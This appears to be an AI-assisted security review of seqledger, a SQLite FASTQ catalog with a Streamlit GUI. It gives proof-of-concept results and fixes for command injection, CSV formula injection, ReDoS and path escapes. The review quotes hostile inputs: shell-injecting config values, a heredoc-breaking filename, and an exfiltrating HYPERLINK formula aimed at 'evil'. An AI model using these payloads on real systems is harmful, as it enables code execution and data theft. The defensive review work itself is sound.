# seqledger -- Database Security & Data-Integrity Review

Scope: SQLite catalog of FASTQ files on a shared HPC cluster (stdlib CLI writer +
read-only Streamlit GUI reached over an ssh tunnel). Repo read-only; all PoCs run
under the session scratchpad. Branch devel. sqlite 3.49.2, pandas 3.0.3,
streamlit 1.59.0, Python 3.12.

## (a) Verdict (overall risk: HIGH)

1. Core SQL is almost entirely parameterized; the few f-string/`%`-built statements
   interpolate only hardcoded identifiers, so there is no classic SQL injection.
2. The real exposure is COMMAND injection: user- and config-controlled strings
   (mapfile R1/R2 filenames, per-catalog config values) are pasted unquoted into
   generated qsub/rclone shell scripts, and several PoCs here get arbitrary code to
   run. CONFIRMED.
3. The GUI binds 0.0.0.0 with no authentication and the catalog DB is created
   world-readable (0644), so any other user on the compute node's network can read
   usernames, paths, and PII and reach the app. CONFIRMED.
4. The CSV formula-injection guard (`_csv_safe_df`) is a dead no-op under the
   installed pandas 3 (string columns are no longer `object` dtype). CONFIRMED.
5. Transactions/migrations are sound (the files re-key is atomic and FK-clean, verified
   by a crash-injection PoC); the data-integrity bugs are in input handling, not commit
   boundaries.

## (b) Findings

### CRITICAL

**C1. Command injection via config values pasted unquoted into generated qsub/rclone/GUI scripts**
`seqledger/cli.py:411-433` (`_batch_script`), `seqledger/gui.py:155-192` (`_gui_job_script`),
`seqledger/rclone.py:369-405` (`build_copy_script`).
`conda_env`, `io_queue`, and `rclone_module` come from the `config` table
(`db.get_config`) and are interpolated raw into `conda activate {conda_env}`,
`#$ -q {io_queue} -l ioq`, and `module load {rclone_module}`. None is quoted or
validated. Only `db_abs`/`dest`/`APP_PATH` get `shlex.quote`.
Exploit (CONFIRMED, `poc/p2_config_injection.py`): a config of
`conda_env = "seqledger; touch A B #"` makes every batch and GUI job run
`conda activate seqledger; touch A B #`; `io_queue` with an embedded newline injects
an attacker `#$ -M attacker@host -m bea` SGE directive; `rclone_module` with `;` runs
in the copy job. All three marker files were created by executing the generated
scripts. Reached by anyone who can write the shared catalog (see H2) or who ran
`init-db --set KEY=VALUE` (CLI accepts arbitrary keys, cli.py:85-92). The GUI feeds
these same config values into the rclone script it hands users (gui.py streamlit
`build_copy_script` call, streamlit_app.py:1282-1286).
Fix: `shlex.quote` every interpolated value, reject newlines, and validate
`io_queue`/`conda_env`/`rclone_module` against a strict `[A-Za-z0-9._/-]+` allowlist
before writing any script.

**C2. Command injection via mapfile R1/R2 filename into the rclone copy-job heredoc**
`seqledger/rclone.py:355-366` (`build_copy_script`): each file's `rel_path` is written
verbatim into a `cat > "$LIST" <<'FILES' ... FILES` heredoc. A `rel_path` containing a
newline plus a line equal to the `FILES` sentinel closes the heredoc early and the rest
of the field is executed as shell.
Exploit (CONFIRMED, `poc/p1_rclone_heredoc.py`): a mapfile R1 cell (valid quoted CSV)
of `"a_1.fastq.gz\nFILES\ntouch PWNED\ncat <<'FILES'\n"` is stored as the file's
rel_path by ingest, then `build_copy_script` emits a job that creates the PWNED marker
when run. The malicious filename reaches the DB purely from an ingested mapfile, so an
untrusted mapfile -> a colleague clicking "generate copy job" in the GUI -> code
execution on the I/O queue under the colleague's account.
Fix: reject/para-sanitize filenames containing newlines (and control chars) at ingest
(validate.py), and build the `--files-from` list with a randomized heredoc delimiter or
`printf '%s\n'` with quoting rather than a fixed-sentinel heredoc.

### HIGH

**H1. GUI binds 0.0.0.0 with no authentication, XSRF/CORS unconfigured**
`seqledger/gui.py:125-127` and `:180` start Streamlit with
`--server.address 0.0.0.0` and no auth. The code comments mark this DEFERRED and lean
on "HPC firewall/ACL". On a shared compute node, any other cluster user who can reach
`NODE:PORT` on the internal network gets the full catalog (owner usernames, absolute
paths, emails-in-UniqID) with no login, and can drive the Grab-&-Go/rclone script
builder. No `.streamlit/config.toml`, so XSRF/CORS are at Streamlit defaults.
Exploit: PLAUSIBLE (depends on node ACLs; code confirms the bind and absent auth).
Fix: bind `127.0.0.1` and document that the ssh tunnel must target localhost
(`ssh -L p:localhost:p`), or put Streamlit behind an auth proxy / `--server.enableCORS`
hardening; do not rely on an unstated firewall.

**H2. Catalog DB created world-readable; no restrictive mode on a shared cluster**
`seqledger/db.py:241-246` (`connect`) opens/creates the DB with the process umask; with
a typical 022 umask the file lands at 0644 (CONFIRMED, `poc/p11_conn.py`). On a shared
filesystem every other user can read the catalog: owner usernames (`owner_name`),
absolute data paths, taxon/UniqID (UniqID is sometimes a URL/PII), and login host.
Nothing sets `0600` or a restrictive dir. `journal_mode=delete` + `-journal` sidecars
are written next to the DB on whatever filesystem the catalog lives on (NFS) and are
equally readable.
Fix: `os.chmod(db_path, 0o600)` (or `0640` with a controlled group) right after
`init_db` creates it, and document a restrictive parent dir.

**H3. CSV formula-injection sanitizer is a dead no-op under pandas 3**
`seqledger/app/streamlit_app.py:509-516` (`_csv_safe_df`) only scans columns where
`out[c].dtype == object`. Under the installed pandas 3.0.3, text columns from
`pd.read_sql_query` are dtype `str` (string), not `object`, so the loop touches nothing
and `=`,`+`,`-`,`@` cells export unprefixed.
Exploit (CONFIRMED, `poc/p3_csv.py`): a taxon/UniqID of
`=HYPERLINK("http://evil/"&A1,"x")` (ingested from a mapfile or returned by WoRMS) is
written straight into every downloaded CSV (Samples/Files/Projects/Grab-&-Go). Opening
it in Excel/Sheets runs the formula -> data exfiltration / command via DDE.
This is also exactly why `tests/test_gui_app.py::test_csv_safe_df_...` FAILS: the TEST
is right, the FUNCTION is wrong. (The failure reproduces because that test builds its
frame with a literal `["=cmd()","Gadus"]`, which under pandas 3 is a `str` column, so
even the test frame no longer hits the `object` branch.)
Fix: select text columns by `pd.api.types.is_string_dtype`/`is_object_dtype` (or just
`df.select_dtypes(include=["object","string"])`), not `== object`.

### MEDIUM

**M1. Regex-search DoS (ReDoS) on the shared GUI process**
`seqledger/app/streamlit_app.py:1032-1061`. The Grab-&-Go regex toggle caps pattern
length (250) and rows (5000) but the stdlib `re` engine has no match timeout, and the
Samples/Files/Projects sidebar `_contains` (`:486-492`) passes the search box straight
to `str.contains(... )` as a REGEX with no `regex=False` and no guard at all.
Exploit (CONFIRMED, `/tmp` timing run): the 17-char pattern `^(\w+\s?;?\s?)*$` passes
`_validate_regex`; on object-dtype lineage strings it backtracks exponentially (0.07s ->
0.26s -> 1.0s -> 4.0s as input grows by 2 chars). One request freezes the single shared
Streamlit process for all tunneled users. (On the pyarrow-backed string columns the RE2
engine is linear, so impact depends on dtype/backend -- hence MEDIUM.) Separately,
`_contains` treating the plain Samples/Files search as a regex means a stray `(` throws
an ArrowInvalid/`re.error` the view does not catch.
Fix: pass `regex=False` in `_contains`; run user regex with a hard wall-clock cap
(subprocess/thread with timeout) or a linear engine (`google-re2`), not raw `re`.

**M2. `integrity --collect` trusts attacker-controllable file_pk, status, and n_reads from result JSON**
`seqledger/integrity.py:442-501` + `_persist` (`:141-146`). Collect reads every
`*.json` (with a `.done` sibling) in a directory and does
`UPDATE files SET integrity_status=?, gz_ok=?, n_reads=? WHERE file_pk=?` using the
`file_pk` and values straight from the JSON, with no check that the pk belongs to the
named `project_id` and no type validation on `n_reads`.
Exploit (CONFIRMED, `poc/p5_collect.py`): a JSON labeled `project_id=projA` carrying
another project's `file_pk` overwrites that unrelated file's integrity row, and
`n_reads:"lots"` is stored as a TEXT value in an INTEGER column (sqlite keeps it).
The batch-results dir lives under a user-supplied `--batch-dir` on the shared FS, so a
careless shared/renumbered dir or a planted JSON corrupts integrity state for arbitrary
files. Fix: validate each `file_pk` is `int` and belongs to the JSON's `project_id`
(`... WHERE file_pk=? AND project_id=?`), and coerce/validate `n_reads` to int-or-null.

**M3. Path/symlink escape of seqdata_root during disk discovery**
`seqledger/ingest.py:139-168` (`_discover_disk_files`) uses
`glob.glob(os.path.join(data_dir,"**",pat), recursive=True)`, which follows
directory symlinks, and records `os.path.relpath(p, seqdata_root)` with no check that
the real file stays under the root.
Exploit (CONFIRMED, `poc/p12_relpath.py`): a symlink `raw/LAB-1_p/ext -> /elsewhere`
makes ingest catalog `LAB-1_p/ext/x_1.fastq.gz`; integrity then reads, and the rclone
builder then copies, a file physically outside the intended tree. A mapfile R1 of
`../../other_project/f.fastq.gz` similarly stores a traversing rel_path. On a
multi-user tree this reads/copies another user's data under the project's identity.
Fix: resolve each discovered path with `os.path.realpath` and skip any whose real path
is not under `realpath(seqdata_root)`; reject `..`/absolute components in mapfile R1/R2.

**M4. One malformed mapfile aborts the entire auto-discovery run**
`seqledger/ingest.py:210-218` (`_read_csv`) uses the csv module with the default 128 KiB
field limit and no per-project try/except around `ingest_project` in `ingest_tree`
(`:573-616`).
Exploit (CONFIRMED, `poc/p10_mapfile.py`): a single mapfile with a >128 KiB field
raises `_csv.Error` that propagates out of `ingest_tree`; projects discovered
alphabetically after it are never ingested (only `A_proj` landed; `B_proj` blew up,
`C_proj` skipped). A careless or malicious oversized cell silently truncates the
catalog. Fix: wrap each project's load in try/except (record a `broken_mapfile`-style
status and continue), and/or raise `csv.field_size_limit` with an explicit cap.

**M5. Duplicate mapfile header column silently overrides the sample ID**
`seqledger/ingest.py:217` builds each row as
`{header[i]: raw[i] for i in range(min(len(header),len(raw)))}`; a repeated header name
collapses to the last value. `plan_rows` then keys on `header[0]` ("ID").
Exploit (CONFIRMED, `poc/p10_mapfile.py`): header `ID,R1,R2,Taxon,UniqID,ID` makes the
sample's `sample_id` become the 6th column's value ("OVERRIDE") instead of the real
"S1" -- an ingested mapfile can spoof/clobber sample identity. Fix: reject a header with
duplicate (case-insensitive) column names in `header_uniqid_column`/`validate_metadata`.

### LOW

**L1. GUI "read-only" `file:` URI built with raw string concatenation; a `?` in the path defeats mode=ro**
`seqledger/app/streamlit_app.py:151` and `seqledger/db.py:256` do
`sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)` with no `urllib`-style escaping of
`db_path`. A `db_path` (from `--db`/`$SEQLEDGER_DB`) containing `?` makes `mode=ro` part
of the previous key's value, so the GUI connection opens read-write.
Exploit (CONFIRMED, `poc/p6_uri.py`): `--db 'cat.db?cache=shared&x='` lets the GUI's
`_ro_connect` CREATE a table in the catalog; the same path auto-creates a stray DB when
the file is absent. The CLI `connect_ro` survives only because it also sets
`PRAGMA query_only=ON` (the GUI does not). Low because it needs a hostile db_path, but it
shows the GUI's read-only promise rests on string shape. Fix: pass the path via
`?mode=ro&...` after `pathlib`/`urllib.parse.quote`, and add `PRAGMA query_only=ON` to
the GUI connection as defense in depth.

**L2. No `busy_timeout`/journal tuning for the NFS multi-writer story**
`seqledger/db.py:241-246`: `connect` relies on Python's implicit 5 s timeout
(busy_timeout 5000, CONFIRMED p11) and `journal_mode=delete`, `synchronous=FULL`. For a
catalog on NFS with the GUI reading the live master (gui --qsub) this is conservative
(good for integrity) but the rollback `-journal` on NFS is a known corruption risk under
lock loss. The GUI sets a 15 s busy_timeout; the CLI does not set one explicitly. Fix:
set an explicit `PRAGMA busy_timeout` on the writer and document that the catalog should
live on a POSIX-locking filesystem, not NFS.

### INFO

- Query layer (`query.py`) and all core writes are parameterized; the `%`-built
  statements in `taxonomy.py` (`build_name_index`, `ranked_lineage`, `genus_species`)
  interpolate only `?`-placeholder counts, and the f-string DDL in `db.py:_migrate`
  interpolates only the hardcoded `_MIGRATIONS` identifiers -- no injection.
- Files-table re-key migration is ATOMIC and FK-clean: a crash injected between
  `DROP TABLE files` and `RENAME` leaves the uncommitted transaction fully rolled back,
  and a clean re-run rebuilds to `UNIQUE(project_id, rel_path)` with
  `foreign_key_check` empty and cascades intact (CONFIRMED, `poc/p7_migration.py`).
- Legacy `NULL rel_path` is backfilled to the bare basename, so a subsequent
  disk-confirmed re-ingest forks a second row and the md5/md5_match from the old row is
  stranded on the basename-only row (CONFIRMED, `poc/p8_backfill.py`) -- a data-quality
  wart, not a security issue.
- NCBI/WoRMS HTTP: default TLS verification on, explicit 60 s timeouts, taxdump tar
  extracts only the two named members (no `extractall` traversal), no API keys in
  source. No response-size cap on the WoRMS body or taxdump stream (memory/disk DoS from
  a hostile/mitm endpoint) -- minor.
- PII: `owner_name`/`owner_uid`, UniqID-as-URL, and `login_host` flow into every CSV
  export and the GUI with no redaction; combined with H1/H2 this is the main
  confidentiality concern.

## (c) Things done right

- Consistent parameterized SQL in the hot paths; deliberate comments explaining the one
  DDL f-string is constant-only.
- `connect_ro` uses `mode=ro` AND `PRAGMA query_only=ON` (belt-and-suspenders) for the
  concurrent NFS read worker.
- Destructive `--prune`/`--prune-projects` are gated: refused non-interactively without
  `--yes`, a >50% blast-radius cap, and a refusal when roots look unmounted.
- Integrity batch workers never write the shared DB (read-only + JSON emit, merged
  serially by one local `--collect`); JSON writes are atomic via tmp+`os.replace`.
- The files re-key migration refuses rather than hitting a mid-rebuild IntegrityError,
  preserves `file_pk`, and is atomic.
- Encoding handling (BOM/UTF-16/cp1252) for mapfiles and md5 listings is careful.
- `validate_catalog` splits disk scans (no lock) from short per-project write commits.

## (d) Top 5 fixes

1. `shlex.quote` + strict allowlist every user/config value written into the qsub,
   rclone, and GUI scripts, and reject newlines in config and in mapfile filenames
   (kills C1 and C2).
2. Fix `_csv_safe_df` to select string columns by dtype helper, not `== object`, so the
   formula-injection guard actually runs under pandas 3 (H3; makes the failing test
   pass).
3. Bind the GUI to 127.0.0.1 (tunnel to localhost) and `chmod 0600` the catalog on
   create; stop relying on an unstated firewall/umask (H1, H2).
4. In `integrity.collect_json`, constrain each UPDATE to the JSON's own project_id and
   validate `file_pk`/`n_reads` types (M2); resolve discovered paths with `realpath` and
   drop anything outside `seqdata_root` (M3).
5. Make `ingest_tree` resilient per project (try/except + status) and reject duplicate
   header columns and oversized CSV fields, so one bad/hostile mapfile cannot truncate
   the catalog or spoof a sample ID (M4, M5).

PoC scripts: /tmp/claude-1000/-home-dmacguig-Documents-GitHub-seqledger/3bcc3cd7-35f2-45f8-8e0b-6b4fa8b86b3c/scratchpad/dbsec/poc/
